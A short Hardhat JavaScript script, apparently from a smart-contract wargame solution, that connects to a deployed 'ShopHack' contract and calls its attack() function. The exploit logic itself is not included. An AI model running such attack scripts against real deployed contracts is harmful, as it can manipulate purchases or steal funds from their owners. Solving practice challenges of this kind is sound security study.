const hre = require("hardhat");
const hackABI = require("../artifacts/contracts/ShopHack.sol/ShopHack.json").abi;

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address); 

    const hackAddress = "0xfBB5Dcba8a198B3e8cc12d1AE73d1B92f0d3b355"
    const hackContract = new hre.ethers.Contract(hackAddress, hackABI, deployer);

    const result = await hackContract.attack();
    await result.wait();

    console.log("Attack executed, transaction hash:", result.hash);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });